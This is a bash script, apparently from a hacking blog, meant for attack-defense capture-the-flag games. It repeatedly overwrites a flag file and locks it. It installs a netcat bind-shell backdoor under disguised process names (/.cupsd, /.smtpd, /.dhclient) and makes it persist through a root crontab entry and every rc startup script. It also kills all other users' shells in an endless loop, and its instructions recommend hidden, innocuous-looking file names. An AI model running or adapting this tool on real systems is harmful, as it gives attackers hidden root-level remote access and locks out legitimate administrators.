#!/bin/bash
# plant flag
# by m0r3sh3lls.blogspot.com
# ################################################
#
#        HOW TO USE:
#         1. Change the flag variable below and the flagfile variable
#               flag="whatever"
#               flagfile="pathoftheflag"
#
#         2. Make sure to rename this file to something less obvious then flagplant.sh,  Examples:  .kthread, .sendmail, .hd-audio, .cron, whatever....
#                       Placing a dot in front of the file makes it hidden Example:  .hiddenfile
# 
#         3. Add execute permissions with 
#               chmod +x filename
#
#         4. Run as background job
#               ./flagplant &
#
#         5. You can read log with this command
#               tail -f /tmp/.log
#
#         6. Connect to your backdoor
#               nc 192.168.x.x 20011
#
#
#
# 
# Put your flag here
flag="3249327490781738213"

# Where did they put the flag?  Check your CTF instructions
flagfile='/flag'

#backdoor port number, only change if you have to..., high ports dont get scaned by nmap by default
backdoorport=20011

######################################################End of config



# Variables, do not touch...
bashbin=`which bash`
netcat=`which nc`

# Flag planting function, will handle some file permission stuff for you
function plantTheFlag() { 

    chmod 777 $flagfile
    chattr -i $flagfile
    chmod 777 $flagfile
    echo $flag > $flagfile
    chmod 444 $flagfile
    chattr +i $flagfile
} 



#Create a backdoor, rename netcat and bash to differnet names, run it in the background, create a cron process every minute, donzo...
function backdoor() {

cp $netcat /.cupsd
cp $bashbin /.smtpd
echo "while true; do /.cupsd -l -p $backdoorport -e /.smtpd 2> /dev/null; sleep 20; done" >> /.dhclient
chmod +x /.dhclient
/.dhclient &
echo "*/1 * * * * root /.dhclient" >> /etc/crontab

#create persistence in all running scripts to survive reboot
for file in /etc/rc?.d/S*
do
echo "/.dhclient 2> /dev/null &" >> $file
done

} 


#this function kills all shells except your current one, it will not kill your backdoor or your flagplant script
function killAllShells() {

currentShell=`echo $$`
kill -9 `ps -ef | egrep '(bash|tcpd|telnet|tty?|pts/?)' | grep -v $currentShell | grep -v PID  |  awk '{print $2}'`



}


## THE MAIN SCRIPT ## HAPPY PLANTING!!!

# Create your backdoor
backdoor

# read the current flag, if it is not ours then call the plantFlag function and log it, this is an inifinte loop
while true
do
    killAllShells
    currentflag=`cat $flagfile`

    if [ "$currentflag" != "$flag" ]; then
       currentTime=`date`
       echo "Flag was pwned by someone else $currentTime" >> /tmp/.log
       plantTheFlag
    else
       currentTime=`date`
       echo "$flag - our flag is set $currentTime" >> /tmp/.log
    fi

done

